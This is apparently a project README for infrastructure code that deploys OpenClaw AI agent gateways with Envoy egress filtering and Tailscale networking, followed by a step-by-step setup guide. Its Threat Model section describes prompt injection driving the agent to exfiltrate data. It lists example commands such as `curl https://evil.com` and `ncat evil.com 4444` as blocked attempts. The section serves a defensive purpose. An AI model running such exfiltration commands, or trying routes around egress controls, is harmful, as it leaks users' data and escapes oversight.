# openclaw-deploy

[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
[![Pulumi](https://img.shields.io/badge/Pulumi-IaC-8A3391?logo=pulumi&logoColor=white)](https://www.pulumi.com)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-supported-6E56CF)](https://docs.openclaw.ai)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/schmitthub/openclaw-docker)

Pulumi TypeScript IaC that provisions remote VPS hosts and deploys [OpenClaw](https://openclaw.ai) gateway fleets with network-level egress isolation via Envoy proxy and Tailscale networking.

> Early development — features and conventions may change. Contributions and feedback welcome!

## Table of Contents

- [openclaw-deploy](#openclaw-deploy)
  - [Table of Contents](#table-of-contents)
  - [Architecture](#architecture)
  - [Threat Model](#threat-model)
  - [Prerequisites](#prerequisites)
  - [Quickstart](#quickstart)
  - [Stack Configuration](#stack-configuration)
  - [Component Hierarchy](#component-hierarchy)
  - [Egress Domain Whitelist](#egress-domain-whitelist)
  - [Experimental Runtime Binary Persistence](#experimental-runtime-binary-persistence)
  - [Try it: Deploy OpenClaw with Telegram and Private Discord server access](#try-it-deploy-openclaw-with-telegram-and-private-discord-server-access)
    - [1) Register accounts and create API credentials](#1-register-accounts-and-create-api-credentials)
      - [**Openrouter**](#openrouter)
      - [Tailscale](#tailscale)
      - [**Hetzner Cloud**](#hetzner-cloud)
      - [**Discord**](#discord)
      - [**Telegram**](#telegram)
      - [**Brave Search API**](#brave-search-api)
      - [**Pulumi**](#pulumi)
      - [Setup and init the stack](#setup-and-init-the-stack)
      - [Set provider + secret config in Pulumi](#set-provider--secret-config-in-pulumi)
      - [Deploy and verify](#deploy-and-verify)
      - [Post-deploy operational notes](#post-deploy-operational-notes)

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│  Remote VPS (Hetzner / DigitalOcean / Oracle Cloud)                  │
│                                                                      │
│   Per gateway: 1 bridge network + 3 containers (shared netns)        │
│                                                                      │
│   ┌──────────────────────────────────────────────────────────────┐   │
│   │  openclaw-net-<profile> (bridge network)                     │   │
│   │                                                              │   │
│   │   ┌────────────────────────────────────────────────────┐     │   │
│   │   │  tailscale-<profile> (sidecar — owns netns)        │     │   │
│   │   │  • Tailscale containerboot (official entrypoint)   │     │   │
│   │   │  • TS_SERVE_CONFIG → serve-config.json             │     │   │
│   │   │  • iptables REDIRECT (root-owned, immutable)       │     │   │
│   │   │  • dns: [1.1.1.2, 1.0.0.2] (Cloudflare)           │     │   │
│   │   │  • /dev/net/tun (kernel networking)                │     │   │
│   │   │                                                    │     │   │
│   │   │  sidecar-entrypoint.sh (runs before containerboot):│     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │ NAT: RETURN for uid 101 (envoy)              │  │     │   │
│   │   │  │ NAT: RETURN for uid 0 (root/containerboot)   │  │     │   │
│   │   │  │ NAT: SSH/TCP → REDIRECT :10001+ (per-rule)   │  │     │   │
│   │   │  │ NAT: ALL TCP → REDIRECT :10000 (catch-all)   │  │     │   │
│   │   │  │ UDP: ACCEPT Docker DNS (127.0.0.11)          │  │     │   │
│   │   │  │ UDP: ACCEPT root (containerboot)             │  │     │   │
│   │   │  │ UDP: DROP all others                         │  │     │   │
│   │   │  │ exec containerboot (Tailscale entrypoint)    │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   │                                                    │     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │  envoy-<profile> (network_mode: container:)  │  │     │   │
│   │   │  │                                              │  │     │   │
│   │   │  │  TLS (:10000):                               │  │     │   │
│   │   │  │  • TLS Inspector (SNI) + domain whitelist    │  │     │   │
│   │   │  │  • MITM inspection (optional per-rule)       │  │     │   │
│   │   │  │                                              │  │     │   │
│   │   │  │  SSH/TCP (:10001+):                          │  │     │   │
│   │   │  │  • Per-rule tcp_proxy (STRICT_DNS / STATIC)  │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   │                                                    │     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │  openclaw-<profile> (network_mode: container:)│  │     │   │
│   │   │  │  • OpenClaw + pnpm + bun + brew + uv         │  │     │   │
│   │   │  │  • sshd on :2222 (loopback)                  │  │     │   │
│   │   │  │  • No CAP_NET_ADMIN, no iptables             │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   └────────────────────────────────────────────────────┘     │   │
│   │              ... (N gateways per server)                     │   │
│   └──────────────────────────────────────────────────────────────┘   │
│                                                                      │
│   Tailscale Serve exposes per gateway:                               │
│     • HTTPS :443 /        → http://127.0.0.1:18789 (Control UI)  │
│     • HTTPS :443 /browse/   → http://127.0.0.1:8080 (File Browser)  │
│     • SSH :22 → 127.0.0.1:2222 (sshd in gateway)                    │
│                                                                      │
│   Docker daemon (provisioned by HostBootstrap)                       │
└──────────────────────────────────────────────────────────────────────┘

Operator machine:
  $ pulumi up --stack dev     # provisions server + deploys everything
  $ pulumi destroy --stack dev  # tears down
```

One Pulumi stack = one server. Each server runs N gateway instances, each with a dedicated Tailscale sidecar + Envoy egress proxy. All three containers per gateway share a single network namespace owned by the sidecar. Tailscale Serve handles ingress (HTTPS for Control UI, File Browser at `/browse/`, SSH for terminal access). No self-managed TLS certificates or reverse proxies.

Gateway containers mount the OpenClaw runtime home and Linuxbrew data paths as named Docker volumes so runtime-installed binaries persist across container recreation. This is intentionally experimental and trades container purity for operational flexibility.

## Threat Model

**Threat:** Prompt injection coerces the AI agent into exfiltrating data. The agent can run any tool available in the container — `curl`, `wget`, `ncat`, `ssh`, raw sockets, subprocesses. It can use any port, any protocol, and target any destination. Application-level proxy settings (`HTTP_PROXY`) are trivially bypassed.

**Defense-in-depth (four layers):**

| Layer                                 | Mechanism                                                                       | What it stops                                         | Bypassable by `node` user?                         |
| ------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------- | -------------------------------------------------- |
| **1. iptables REDIRECT + UDP DROP**   | Root-owned rules in sidecar: SSH/TCP → specific Envoy ports, all TCP → :10000   | Every TCP connection goes through Envoy               | No (`CAP_NET_ADMIN` required, sidecar only)        |
| **2. Envoy protocol-aware whitelist** | TLS: SNI inspection + domain whitelist. SSH/TCP: per-rule port-mapped listeners | Non-whitelisted HTTPS, non-mapped SSH/TCP, plain HTTP | No (Envoy resolves DNS independently)              |
| **3. Egress policy engine**           | Typed `EgressRule[]` with domain/IP + protocol support (TLS, SSH, TCP)          | Structured policy control with per-protocol handling  | No (Envoy config, not in container)                |
| **4. Malware-blocking DNS**           | Cloudflare 1.1.1.2 / 1.0.0.2 via sidecar `dns:` config (inherited by all)       | Known malware, phishing, and C2 domains               | No (Docker DNS config, containers cannot override) |

**UDP exfiltration prevention:** The sidecar's iptables rules allow Docker DNS (127.0.0.11), root-owned UDP (containerboot/tailscaled for WireGuard), and DROP all other UDP. The `node` user cannot send UDP.

**Why SNI spoofing doesn't work:** If an attacker forges the SNI to `api.anthropic.com` while connecting to `evil.com`'s IP, Envoy resolves `api.anthropic.com` via DNS independently and connects to the **real** IP — not the attacker's server.

**What gets blocked / allowed:**

- `curl https://evil.com` — SNI not in whitelist → **BLOCKED**
- `ssh user@evil.com` — no SSH egress rule configured → **BLOCKED**
- `ssh git@github.com` — SSH rule with port 22 in egressPolicy → **ALLOWED** (via dedicated Envoy listener)
- `ncat evil.com 4444` — no matching TCP rule → **BLOCKED**
- `python3 -c "import socket; s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
- `curl https://api.anthropic.com` — SNI matches whitelist → **ALLOWED**

## Prerequisites

- [Node.js](https://nodejs.org/) (v18+)
- [Pulumi CLI](https://www.pulumi.com/docs/install/)
- [Tailscale](https://tailscale.com/) account with an auth key
- A VPS provider account with an SSH key uploaded: [Hetzner Cloud](https://www.hetzner.com/cloud), [DigitalOcean](https://www.digitalocean.com/), or [Oracle Cloud](https://www.oracle.com/cloud/)

## Quickstart

```bash
# Clone and install
git clone https://github.com/schmitthub/openclaw-docker.git openclaw-deploy
cd openclaw-deploy
npm install

# Initialize a stack
pulumi stack init dev
cp Pulumi.dev.yaml.example Pulumi.dev.yaml

# Set required secrets
pulumi config set --secret tailscaleAuthKey <your-tailscale-auth-key>

# Edit Pulumi.dev.yaml with your server config, egress policy, and gateway profiles

# Deploy
pulumi up
```

`pulumi up` will:

1. Provision a VPS (Hetzner, DigitalOcean, or Oracle Cloud)
2. Install Docker + fail2ban on the host
3. Render Envoy config + generate TLS certificates
4. Build gateway Docker images and deploy containers (sidecar + envoy + gateway per profile)
5. Configure each gateway via ephemeral init container
6. Tailscale Serve auto-configured via `TS_SERVE_CONFIG` (HTTPS + SSH)

## Stack Configuration

Configuration lives in `Pulumi.<stack>.yaml`. See `Pulumi.dev.yaml.example` for a complete example.

| Key                          | Type                                          | Required | Description                                        |
| ---------------------------- | --------------------------------------------- | -------- | -------------------------------------------------- |
| `provider`                   | `"hetzner"` \| `"digitalocean"` \| `"oracle"` | yes      | VPS provider                                       |
| `serverType`                 | string                                        | yes      | Server type (e.g. `cx22`, `cax21`)                 |
| `region`                     | string                                        | yes      | Datacenter region (e.g. `fsn1`)                    |
| `sshKeyId`                   | string                                        | no       | SSH key ID at provider (auto-generated if omitted) |
| `tailscaleAuthKey`           | secret                                        | yes      | One-time Tailscale auth key                        |
| `egressPolicy`               | `EgressRule[]`                                | yes      | User egress rules (additive to hardcoded)          |
| `gateways`                   | `GatewayConfig[]`                             | yes      | Gateway profile definitions (1+)                   |
| `gatewayToken-<profile>`     | secret                                        | no       | Auth token override (auto-generated if omitted)    |
| `gatewaySecretEnv-<profile>` | secret                                        | no       | JSON `{"KEY":"value"}` env vars for init + runtime |

**Gateway profile fields:**

| Field            | Type        | Description                                                                   |
| ---------------- | ----------- | ----------------------------------------------------------------------------- |
| `profile`        | string      | Unique name (used in resource names)                                          |
| `version`        | string      | OpenClaw version (`latest` or semver)                                         |
| `port`           | number      | Gateway port (e.g. `18789`)                                                   |
| `installBrowser` | boolean     | Install Chromium + Xvfb; auto-sets `browser.headless` and `browser.noSandbox` |
| `imageSteps`     | ImageStep[] | Custom Dockerfile RUN instructions (`{run}` pairs, always root)               |
| `setupCommands`  | string[]    | OpenClaw subcommands run in init container (e.g. `onboard`)                   |
| `env`            | object      | Extra environment variables                                                   |

## Component Hierarchy

Components compose sequentially — each depends on the previous:

```
Server (VPS provisioning: Hetzner / DigitalOcean / Oracle)
  ↓ connection (public IP SSH)
HostBootstrap (Docker + fail2ban install)
  ↓ dockerHost (public IP SSH)
EnvoyEgress (config rendering + cert generation — no Docker resources)
  ↓ envoyConfigPath, envoyConfigHash, inspectedDomains
Gateway(s) (1+ per server: bridge network + sidecar + envoy + gateway containers)
  ↓ Tailscale Serve (HTTPS + SSH via TS_SERVE_CONFIG)
```

| Component       | Pulumi Type                    | Provider                             | Purpose                                                                      |
| --------------- | ------------------------------ | ------------------------------------ | ---------------------------------------------------------------------------- |
| `Server`        | `openclaw:infra:Server`        | `@pulumi/hcloud` / DO / OCI          | Provision VPS, expose IP + SSH connection                                    |
| `HostBootstrap` | `openclaw:infra:HostBootstrap` | `@pulumi/command`                    | Install Docker + fail2ban on bare host                                       |
| `EnvoyEgress`   | `openclaw:infra:EnvoyEgress`   | `@pulumi/command`                    | Render envoy.yaml, upload config, generate CA + MITM certs                   |
| `Gateway`       | `openclaw:app:Gateway`         | `@pulumi/docker` + `@pulumi/command` | Create bridge network, sidecar, envoy, gateway containers; configure gateway |

## Egress Domain Whitelist

Envoy enforces protocol-aware egress filtering: TLS connections are filtered by SNI whitelist, SSH/TCP connections are forwarded via per-rule dedicated listeners, and all other traffic is denied.

**Always included (hardcoded, cannot be removed):**

| Category       | Domains                                                                                                                |
| -------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Infrastructure | `clawhub.com`, `registry.npmjs.org`                                                                                    |
| AI providers   | `api.anthropic.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `openrouter.ai`, `api.x.ai`                |
| Homebrew       | `github.com`, `*.githubusercontent.com`, `ghcr.io`, `formulae.brew.sh`                                                 |
| Tailscale      | `*.tailscale.com` (wildcard — covers control plane, DERP relays, all subdomains), `*.api.letsencrypt.org` (ACME certs) |

User-defined `egressPolicy` rules are **additive** — hardcoded domains are always present. Duplicates are deduplicated by `mergeEgressPolicy()`.

```yaml
# Example: TLS domains, SSH access, and TCP database
openclaw-deploy:egressPolicy:
  - dst: "discord.com"
    proto: tls
    action: allow
  - dst: "gateway.discord.gg"
    proto: tls
    action: allow
  - dst: "cdn.discordapp.com"
    proto: tls
    action: allow
  - dst: "github.com"
    proto: ssh
    port: 22
    action: allow
  - dst: "db.example.com"
    proto: tcp
    port: 5432
    action: allow
```

SSH/TCP rules use per-rule port mapping: each rule gets a dedicated Envoy listener port (starting from 10001), and destination-specific iptables REDIRECT rules in the sidecar entrypoint route matching traffic to the correct port. Domain resolution happens at container startup.

## Experimental Runtime Binary Persistence

This project currently uses a non-standard, intentionally experimental container pattern to support runtime binary installs:

- The gateway creates a persistent named volume for the OpenClaw user home (`/home/node`).
- The gateway creates a persistent named volume for Linuxbrew data (`/home/linuxbrew/.linuxbrew`).

Why this exists: I want to test whether persistent user-space runtime installs (pnpm/brew/uv/etc.) are practical for gateway operations.

Why this is experimental: it is admittedly ugly and goes against normal immutable-container conventions. It is included deliberately while I evaluate the trade-offs.

Operational notes:

- On first run, Tailscale will register your gateway and assign it a random tailnet domain on your tailscale network. It can always be found in the Tailscale admin console. This domain changes every time you rebuild the stack or recreate the sidecar container (stopping/restarting does not change it).
- Gateway is not a daemon supervisor process; after installing a new binary, restart is required for predictable runtime behavior.
- From the host, you can SSH into the VPS host and restart with Docker (`docker restart openclaw-<profile>`) (ssh key is stored in Pulumi).
- For day-to-day remote access, SSH into the gateway via Tailscale: `ssh root@<device_tailnetdomain>.ts.net` (Tailscale Serve forwards port 22 to sshd on port 2222 inside the gateway).
- Control UI is available at `https://<device_tailnetdomain>.ts.net#token=<gateway-token>`.
- File Browser is available at `https://<device_tailnetdomain>.ts.net/browse/`.

Runtime install workflow (example):

1. SSH into the gateway: `ssh root@<device_tailnetdomain>.ts.net`
2. Switch to the node user: `su - node`
3. Install your runtime binary using the package manager of choice (e.g. `brew`, `pnpm`, or `uv`).
4. Exit and restart: `docker restart openclaw-<profile>` from the host, or `kill 1` as root inside the container.

Because `/home/node` and `/home/linuxbrew/.linuxbrew` are persistent named volumes, installed binaries and package-manager state persist across container restarts/recreation.

## Try it: Deploy OpenClaw with Telegram and Private Discord server access

This is a very unfriendly end-to-end guide for deploying a VPS server [for just you and the claw to chat on a private discord server you create across multiple channels](https://docs.openclaw.ai/channels/discord#quick-setup). I recommend a Hetzner stack since its all I've tested end to end (as of this writing I haven't tested Digital Ocean at all, should be ready in a day or two. OCI never has free tier available). You should probably clone or fork, but I've gitignored `Pulumi.*.yaml` so it should be safe for locally screwing around, and `pre-commit` will block secrets if you install it and try to commit (mostly).

If you are able to struggle through this without losing your sanity, you should be in a good position to customize the deployment for your own use case. And you'll have a nicely deployed locked down openclaw in about 10 mins without doing anything but waiting for it to connect to your discord channel.

Once it does I recommend using this guide to onboard and configure it [https://amankhan1.substack.com/p/how-to-make-your-openclaw-agent-useful](https://amankhan1.substack.com/p/how-to-make-your-openclaw-agent-useful)

But as per that guide at the very least your first message to the bot should be:

- "Hey, let's get you set up. Read BOOTSTRAP.md and walk me through it." To get it onboarded with you followed by...
- "When I ask questions in Discord channels, use memory_search or memory_get if you need long-term context from MEMORY.md."

As I iron out the kinks and rough edges, I will update this guide to be more user-friendly. But in all fairness OpenClaw itself is very difficult to set up, its documentation rarely is fully accurate, and I had to resort to cloning locally and letting a claude code agent analyze it with Serena LSP to figure out the code paths and actual settings and constraints, there are actually many bugs and gotchas in OpenClaw. Disclaimer: I don't blame the maintainers for this is in the new era of AI generate code adding 1000s of lines a second, and its a massive project I had an anxiety attack just looking at the amount of PRs they have to deal with...

OpenClaw platform references:

- Hetzner (tested, recommended): <https://docs.openclaw.ai/install/hetzner>
- DigitalOcean (untested, you can try it): <https://docs.openclaw.ai/platforms/digitalocean>
- Oracle (tested, but free-tier capacity is often unavailable): <https://docs.openclaw.ai/platforms/oracle>

### 1) Register accounts and create API credentials

I recommend creating a `.env` file before starting with this structure (I'll commit a `.env.sample` )

```env
OPENROUTER_API_KEY=
DISCORD_SERVER_ID=
DISCORD_USER_ID=
DISCORD_BOT_TOKEN=
BRAVE_API_KEY=
TS_AUTHKEY=
OCI_TENANCY_ID=
OCI_USER_ID=
HCLOUD_TOKEN=
TELEGRAM_BOT_TOKEN=
TELEGRAM_USER_ID=
```

#### **Openrouter**

- **Signup** Visit [https://openrouter.ai/](https://openrouter.ai/) and create an account. Adding $50 is a decent starting point
- **Customize Autorouter** Immediately go to your [routing settings](https://openrouter.ai/settings/routing) and modify the default auto routing. Before I did this the auto router would use GPT - 5 Nano which literally mispelled the `IDENTITY.md` file during setup when trying to save (`IDENTIY.md`), and couldn't remember instructions at all. It instantly started referring to me as with the name I gave it. Add these and save, don't prevent overrides.

```
minimax/minimax-m2.5
google/gemini-3-flash-preview
google/gemini-3.1-pro-preview
anthropic/*
moonshotai/kimi-k2.5
deepseek/deepseek-v3.2
openai/gpt-5.2
google/gemini-3.1-pro-preview
```

With this config my router tends to always pick minimax which is good enough, you won't be blown away, its no GPT-5 or Opus, but for the price its been great. It has been days and its only cost me 1/3 of what Sonnet 4.6 cost me in 10 minutes. Don't add top frontier models if you want to stick to a budget, but so far I've found it never selects them anyway. I also don't think it supports deepseek in the autorouter it doesn't show up but I kept it in there.

- **Get API Key** Go to [https://openrouter.ai/settings/keys](https://openrouter.ai/settings/keys) and create a new API key. Save the key to your `.env` files `OPENROUTER_API_KEY`

#### Tailscale

- **Signup** Create an account at [https://login.tailscale.com/start](https://login.tailscale.com/start) and log in
- **Create tag** In the Tailscale admin console, go to [Access Controls > Tags](https://login.tailscale.com/admin/acls/visual/tags) and create a new tag (e.g. `tag:openclaw`) for your gateways.
- **Create Auth Key** Go to [https://login.tailscale.com/admin/settings/keys](https://login.tailscale.com/admin/settings/keys) and create a reusable ephemeral auth key with the `tag:openclaw` tag. Tag owner `autogroup:admin`. Save the key to your `.env` file's `TS_AUTHKEY`
- **Setup SSH ACL** not sure if this is needed, if you have ssh access issues try it. [Create an ACL rule](https://login.tailscale.com/admin/acls/visual/tailscale-ssh) in your Tailscale admin that allows you to login to devices registered with the `tag:openclaw` tag as `root` and `node`.

```json
{
  "src": ["autogroup:admin", "autogroup:owner"],
  "dst": ["tag:openclaw"],
  "users": ["autogroup:nonroot", "root", "node"],
  "action": "accept"
}
```

- **Enable HTTPS certs** In the Tailscale admin, go to [DNS settings](https://login.tailscale.com/admin/dns) and enable HTTPS certificates. This is required for Tailscale Serve to automatically provision and manage TLS certificates for your gateways.
- **Start tailscale on your host** Install Tailscale CLI on your operator machine and run `tailscale up`.

#### **Hetzner Cloud**

- Create Hetzner Cloud Account Sign up at <https://console.hetzner.cloud>
- Create a new project (e.g. "openclaw")
- In your your project click **Security** (left sidebar) > **API Tokens** tab
- **Generate API Token** Permission: **Read & Write**. Save the token to your `.env` file's `HCLOUD_TOKEN`

#### **Discord**

> Note: while imo the best option for openclaw interfacing, as of this writing Discord is extremely broken. There are many open bugs related to Openclaw's gateway plugin. When Discord websockets drops with code 1005/1006 (abnormal closure) the discord gateway gets suck in an infinite reconnect loop causing it to constantly lose session information and clogs up your logs, which can eventually corrupt cron jobs etc. And gateway restarts don't fix it you have to restart the entire process (container). No tools can be executed through discord once this loop starts. The bot can only rely on HTTP to chat with you. There are several github issues open but it doesn't seem to be getting a lot of movement. I have it setup anyway because once it is fixed it'll be ready to go

- Setup your discord bot and private server. The official guide handles this pretty well: <https://docs.openclaw.ai/channels/discord#quick-setup>
- Stop at the point where the app is created, added to your server, and you have copied your token, server id (aka guild id), and user id. Pulumi will handle the remaining gateway-side setup.

Save the following to your `.env` file:

```env
DISCORD_SERVER_ID=
DISCORD_USER_ID=
DISCORD_BOT_TOKEN=
```

#### **Telegram**

This is a good baseline interface to have with openclaw and more reliable than discord.

- Create a Telegram bot by chatting with [BotFather](https://t.me/botfather) and following the instructions. Save the generated bot token to your `.env` file's `TELEGRAM_BOT_TOKEN`
- Get your Telegram user ID by chatting with [userinfobot](https://t.me/userinfobot) and saving the returned ID to your `.env` file's `TELEGRAM_USER_ID`

#### **Brave Search API**

- Register at [https://api-dashboard.search.brave.com/register](https://api-dashboard.search.brave.com/register)
- Go to [https://api-dashboard.search.brave.com/app/subscriptions/subscribe](https://api-dashboard.search.brave.com/app/subscriptions/subscribe) and subscribe to Search
- Go to [https://api-dashboard.search.brave.com/app/keys](https://api-dashboard.search.brave.com/app/keys) and create a new API key for your search subscription. Save the key to your `.env` file's `BRAVE_API_KEY`

#### **Pulumi**

Create and use a Pulumi account first:

- [Create](https://app.pulumi.com/signup) a Pulumi account (free tier is enough for this project). Make sure to swtich to **individual** after signing in.
- [Install Pulumi CLI](https://www.pulumi.com/docs/get-started/download-install/) and authenticate from your operator machine.

#### Setup and init the stack

Copy `Pulumi.dev.yaml.example` to `Pulumi.whateveryouwant.yaml`

The profile name for the gateway is `main`, feel free to change it if you care otherwise you can leave everything else as is.

**Setup npm and init Pulumi stack:**

```bash
# From repo root
npm install

# if you haven't already...
pulumi login

# Create/select stack, call it whatever you want...
pulumi stack init openclaw || true
pulumi stack select openclaw
```

#### Set provider + secret config in Pulumi

> For the next steps I will be using the env var names you saved previously.

```bash
# Hetzner provider token
pulumi config set --stack openclaw --secret hcloud:token $HCLOUD_TOKEN

# Tailscale auth key used inside the gateway container
pulumi config set --secret tailscaleAuthKey $TS_AUTHKEY

# Secret env passed to setupCommands and runtime container env
pulumi config set --secret gatewaySecretEnv-main "{\"OPENROUTER_API_KEY\":\"$OPENROUTER_API_KEY\",\"BRAVE_API_KEY\":\"$BRAVE_API_KEY\",\"DISCORD_BOT_TOKEN\":\"$DISCORD_BOT_TOKEN\",\"DISCORD_USER_ID\":\"$DISCORD_USER_ID\",\"DISCORD_SERVER_ID\":\"$DISCORD_SERVER_ID\",\"TELEGRAM_BOT_TOKEN\":\"$TELEGRAM_BOT_TOKEN\",\"TELEGRAM_USER_ID\":\"$TELEGRAM_USER_ID\"}"
```

#### Deploy and verify

```bash
pulumi preview --stack openclaw # pulumi will show you the resources it plans to create, review for sanity

pulumi up --stack openclaw # this will show you the same thing from preview essentially but give you a prompt to contintue ("yes")
```

You'll now see an interactive TUI showing the progress of each resource being created. The most time consuming part will be the `Gateway` resources as it has to build and push docker images, and then wait for the containers to start up and run their init commands. It can take up to 20 minutes. Unfortunately even with docker buildkit it just takes a long time the VPS isn't beefy. I am working on optimization using docker layer caching and multi-stage builds but for now just be patient. You can optionall modify this stuff if you are savvy to build locally and push to a registry and have the server just pull the image instead.

When all done run this command. It is going to show you all your urls, ssh commands, etc. First think you do is navigate to the Control UI URL. The appended token will auth your token, its a one time thing on first visit.

```bash
pulumi stack output gatewayServices --show-secrets # shows tailnet hostname, gateway token, SSH and HTTPS access info
```

- `https://<device_tailnetid>.ts.net#token=<gateway-token>` for Control UI (only need token hash the first time)
- You can always find your tailnet hostname in the Tailscale admin console under "Devices" (e.g. `main.yourtsns.ts.net`), or the Pulumi stack outputs (with your token) (`gatewayServices`).
- `https://<device_tailnetid>.ts.net/browse/` for File Browser. A convenient way to update and manage files. I like it over using an SFTP client but up to you.
- `ssh root@<device_tailnetid>.ts.net` for SSH access (Tailscale Serve forwards to sshd inside gateway)

> It can take a few seconds to a minute after you visit the Control UI URL to work for the first time, this is because tailscale doesn't generate the TLS certs for the HTTPS handlers until the first request comes in, so the gateway is up and running but the HTTPS handlers aren't active until you hit the URL and trigger cert generation. After that it should be smooth sailing.

**If all goes well, you should have a fully operational OpenClaw gateway with Tailscale access, Envoy egress filtering, and runtime binary persistence. Congrats! Say hello to your new friend in telegram or discord and see if it responds. Once again I highly recommend before saying anything at all to it do the setup by prompting "Hey, let's get you set up. Read BOOTSTRAP.md and walk me through it."**

#### Post-deploy operational notes

- If you install new runtime binaries or make configuration changes you often need to restart the gateway container. `openclaw gateway restart` WILL NOT WORK. The container isn't running it as a deamon process. SSH via tailscale as root and run `kill 1`, it will restart the container immediately and it should be up again in seconds: `ssh root@main.yourtsns.ts.net "kill 1"`
- If you need to add a new domain to the envoy whitelist, update your `egressPolicy` in Pulumi config and run `pulumi up` again. This will update the Envoy config and trigger a rolling restart of the envoy and sidecar containers with zero downtime for the gateway container. It will take only a minute to update, you don't have to wait the full 20 minutes like initial deploy. It will restart envoy and the gateway service when its done.
- If you want to add a permanent config that persists indefinitley between rebuilds add it to the command list.
- If you remove a config command, Pulumi will not unset it from your config, it just means it won't ever get set again. You'll have to manually unset the config value using the cli or asking your agent and then restart the gateway container to have it take effect.
